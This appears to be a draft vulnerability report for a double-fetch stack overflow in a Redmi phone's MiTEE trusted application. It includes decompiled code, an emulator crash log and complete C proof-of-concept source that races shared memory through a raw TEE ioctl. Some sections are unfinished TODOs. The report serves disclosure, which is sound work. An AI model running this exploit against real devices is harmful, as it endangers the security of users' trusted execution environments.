
In short, this is a stack-overflow bug of TA (UUID: 377ee4e8-af0e-474f-a9d636a9268fe85c) of MiTEE, triggered by double fetches.

## Device Information

The build fingerprint of the device is `Redmi/iron_eea_global/iron:14/UP1A.231005.007/V816.0.18.0.UNQEUXM:user/release-keys`

The sha1 of the TA is `3184df814c4b0dfe363141572f384be85c226a53`

## Detailed Vulnerability Analysis

The key reason for this vulnerability is the double-fetch problem to the allocated memory between normal world and security world.

The entry point of this bug is the function `TA_InvokeCommandEntryPoint` with command id 0x100b. 

```c
ulong TA_InvokeCommandEntryPoint
                (void *session_context,uint command_id,uint param_types,TEE_Param params) {
  uint *puVar4;
  puVar4 = params._0_8_;
	/* ... */
	switch(command_id) {
	  case 0x100b:
		  /* bug entry */
	    FUN_comm_100b(*puVar4,*(char **)(puVar4 + 4)); 
	    uVar6 = extraout_x0 & 0xffffffff;
	    if ((int)extraout_x0 != 0) {
	      __format = "[%s:%s][%s:%d]has auth failed: %x\n";
	      uVar5 = 0xff;
	      goto LAB_001207b0;
	    }
	    break;
	}   
  /* not related */
}
```

This function exposes three important parameters, i.e., `uint command_id` , `uint param_types` and `TEE_Param params`, which can be easily manipulated by attackers from the normal world.

Based on the GP’s TEE Internal Core API Specification, *value* or *memref* to select is determined by the parameter type specified in the argument *param_types* passed to the entry point. So by setting the second parameter type to something like `TEE_PARAM_TYPE_MEMREF_INPUT`, `puVar4` in the code snippet above can be regarded as shared memory or *memref*, as shown below. And `*(char **)(puVar4 + 4)` is the pointer referring to `params[1].memref.buffer`. Both of them can be accessed and changed from normal world. 


```c
typedef union
{
	struct
	{
		void* buffer; size_t size;
	} memref;
	
	struct
	{
		uint32_t a;
		uint32_t b;
	} value;
} TEE_Param;
```

Then, the function `FUN_comm_100b` takes the controllable buffer pointer as its second argument and invoke the real vulnerable function `combine_file_name` with it.

```C

void FUN_comm_100b(uint uid,char *controllable_buffer)

{
  /* not related */
  printf("[%s:%s][%s:%d]==func enter==\n","SoterApp",&DAT_0010319c,"has_auth_already",0x366);
  /* not related */
  printf("[%s:%s][%s:%d]uid=%s, name=%s\n","SoterApp",&DAT_0010319c,"has_auth_already",0x36d,
         uid_from_param1,controllable_buffer);
  *(undefined8 *)(lVar5 + -0xa0) = 0x1000000080; // for max_len check
  iVar1 = combine_file_name(uid_from_param1,controllable_buffer,(undefined8 *)(lVar5 + -0x88),lVar5 + -0xa0);
  
  if (iVar1 == 0) { /* overflowed buffer will be passed inside. */
    iVar1 = FUN_00125b60(lVar5 + -0x88);
    if (iVar1 == 0) {
      printf("[%s:%s][%s:%d]==func exit==\n","SoterApp",&DAT_0010319c,"has_auth_already",0x379);
      uVar2 = 0;
    }
    else { /* if FUN_00125b60 does not exist properly, print "not exist" */
      printf("[%s:%s][%s:%d]%s not exist\n","SoterApp","ERROR","has_auth_already",0x375,
             lVar5 + -0x88);
      uVar2 = 0xfffffffa;
    }
  }
  /* ... */
  __stack_chk_fail(uVar2); // if the stack canary is overflowed, stack smashing issue can be detected and the program crashes.
}

```

Inside `combine_file_name`, there are two fetches to the `controllable_buffer` point at line 4 and line 13 separately. It can make the result of `strlen()` distinct if attackers try to change the contents in shared memory within the race window (line 4-13).

Specifically, prior to the first fetch, the attacker supplies a short buffer to pass the check at line 6. Before the second fetch, the buffer content is expanded, causing the second `strlen(controllable_buffer)` to compute a length sufficient to induce a stack buffer overflow in `memmove()`.

```C
1  undefined8 combine_file_name(char *param_1,char *controllable_buffer,long file_name,uint *max_len)
2  {
3      param1_len = strlen(param_1);
4      buf1_len = strlen(controllable_buffer); // first fetch
5
6      if (*max_len < (int)buf1_len + (int)param1_len + 1U) { /* length condition check */
7          printf("[%s:%s][%s:%d]short path_name ","SoterApp","ERROR","combine_file_name",0xb);
8          uVar1 = 0xffff0006;
9      }
10      else {
11          /* ... */
12          param1_len = strlen(param_1);
13          buf1_len = strlen(controllable_buffer); // second fetch
14          memmove(file_name + param1_len,controllable_buffer,buf1_len);
15          /* ... */
16      }
17  }
```


## Screenshots for Validity

#TODO


More detailed can be seen in our customized emulation mode.

```bash
[=]     printf: [SoterApp:INFO][TA_CreateEntryPoint:15]==func enter==
[=]     printf: [SoterApp:INFO][TA_OpenSessionEntryPoint:28]==func enter==
[=]     printf: [SoterApp:INFO][TA_InvokeCommandEntryPoint:174]==func enter==
[=]     printf: [SoterApp:INFO][has_auth_already:870]==func enter==
[=]     printf: [SoterApp:INFO][has_auth_already:877]uid=4, name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[+]     TEE_OpenPersistentObject:
[+]             objectID b'4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[+]             file name: ./emulator/files/2147483648/4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+]             ret 0xffff0008
[=]     printf: [SoterApp:ERROR][is_file_exists:35]Open file 4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA fail, err: 0xffff0008

[=]     printf: [SoterApp:ERROR][has_auth_already:885]4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA not exist

[x]     stack_chk_fail ***stack smashing detected***
[x]     =================[lr: 0x555555576ed0] [__stack_chk_fail] memory corruption detected!!
[x]     CPU Context:
[x]     x0      : 0xfffffffa
[x]     x1      : 0x55555555a41e
[x]     x2      : 0x555555559757
[x]     x3      : 0x555555555b34
[x]     x4      : 0x375
[x]     x5      : 0xf0ff48
[x]     x6      : 0xffff0008
[x]     x7      : 0x0
[x]     x8      : 0x4141414141414141
[x]     x9      : 0xcacacacacacacaca
[x]     x10     : 0x5555555744ec
[x]     x11     : 0x84
[x]     x12     : 0x0
[x]     x13     : 0x0
[x]     x14     : 0x0
[x]     x15     : 0x0
[x]     x16     : 0x5555555b92c8
[x]     x17     : 0x99999008
[x]     x18     : 0x0
[x]     x19     : 0xf0ff48
[x]     x20     : 0xf0ff30
[x]     x21     : 0x4
[x]     x22     : 0xf0ffc8
[x]     x23     : 0x55555555719c
[x]     x24     : 0x555555555b34
[x]     x25     : 0xf0ff38
[x]     x26     : 0xf0ff48
[x]     x27     : 0xeee008
[x]     x28     : 0xf0ffd0
[x]     x29     : 0x8000002dddb0
[x]     x30     : 0x555555576ed0
[x]     sp      : 0x8000002ddd50
[x]     pc      : 0xdeadbeef
[x]     lr      : 0x555555576ed0
[x]     cpacr_el1       : 0x300000
[x]     pstate  : 0xa00003c5
[x]     b0      : 0x0
[x]     ...
[x]     PC = 0x00000000deadbeef (unreachable)

[x]     Memory map:
[x]     Start            End              Perm    Label                                    Image
[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_1
[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
[x]     00555555554000 - 00555555574000   r--     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
[x]     00555555574000 - 005555555b6000   r-x     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
[x]     005555555b6000 - 005555555c5000   rw-     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffffffde000 - 008000002de000   rwx     [stack]
```

### Source code of the POC



```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "tee_client_api.h"
#include "repro.h"
#include "tee.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
typedef TEEC_Result (*teec_pre_process_operation_impl_t)(TEEC_Context* ctx,
            TEEC_Operation* operation,
            struct tee_ioctl_param* params,
            TEEC_SharedMemory* shms);

#define teec_pre_process_operation_offset 0x2434

uintptr_t get_lib_base(const char *libname) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("fopen");
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, libname)) {
            uintptr_t base = 0;
            if (sscanf(line, "%lx-%*lx", &base) == 1) {
                fclose(fp);
                return base;
            }
        }
    }

    fclose(fp);
    return 0;
}

void* mod_thread(void* arg){
    while(1){
        ((char*)arg)[0x20] = 0;
        ((char*)arg)[0x20] = 0x41;
    }
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    pthread_t tid;
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    TEEC_SharedMemory shm2 = { };
    shm2.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
    shm2.buffer = mem_area2; // Buffer in use by application
    shm2.size = 0x1000;
    TEEC_Result res2 = TEEC_RegisterSharedMemory_impl(context, &shm2);
    printf("TEEC_RegisterSharedMemory result: %x \n", res2);
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[1].tmpref.buffer = mem_area1; 
    op.params[1].tmpref.size = 0x1000; 
    
    op.params[0].value.a = 4;
    op.params[0].value.b = 4;
	
	memset(mem_area2, 0x41, 0x90);
    
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }


#define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
    uint64_t buf[(sizeof(struct tee_ioctl_invoke_arg) +
            TEEC_CONFIG_PAYLOAD_REF_COUNT *
                sizeof(struct tee_ioctl_param)) /
            sizeof(uint64_t)] = { 0 };
    struct tee_ioctl_buf_data buf_data;
    struct tee_ioctl_invoke_arg *arg;
    struct tee_ioctl_param *params;
    TEEC_Result res;
    uint32_t eorig;
    TEEC_SharedMemory shm[TEEC_CONFIG_PAYLOAD_REF_COUNT];
    int rc;
    buf_data.buf_ptr = (uintptr_t)buf;
    buf_data.buf_len = sizeof(buf);

    arg = (struct tee_ioctl_invoke_arg *)buf;
    arg->num_params = TEEC_CONFIG_PAYLOAD_REF_COUNT;
    params = (struct tee_ioctl_param *)(arg + 1);

    arg->session = session->session_id;
    arg->func = 0x100b;
    
    op.session = session;
   
	teec_pre_process_operation_impl_t teec_pre_process_operation_impl =
        (teec_pre_process_operation_impl_t)((uint8_t*)get_lib_base("libteecli.so") + teec_pre_process_operation_offset);			
 
    res = teec_pre_process_operation_impl(session->ctx, &op, params, shm);
    if (res != TEEC_SUCCESS) {
        printf("teec_pre_process_operation failed!! %x\n", res);
        exit(-1);
    }

	strcpy(shm[1].buffer, "aaa???");
	printf("shm: %s\n", shm[1].buffer);
	mem_area2 = shm[1].buffer;
	memset(mem_area2, 0x41, 0x90);
        //((char*)mem_area2)[0x20] = 0;
	printf("shm: %s\n", shm[1].buffer);
    
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }

    rc = ioctl(session->ctx->fd, TEE_IOC_INVOKE, &buf_data);
    res = arg->ret;
    err_origin = arg->ret_origin; 

    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "377ee4e8-af0e-474f-a9d636a9268fe85c";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}

```

For reference, the dependent files for the PoC are attached here.
- `tee_client_api.h`: Open-sourced in the OPTEE repo
- `tee.h`: Open-sourced in the OPTEE repo
- `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
- `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.



### Vulnerability Reproduction

1. preacquisition
2. interaction
3. clip

#TODO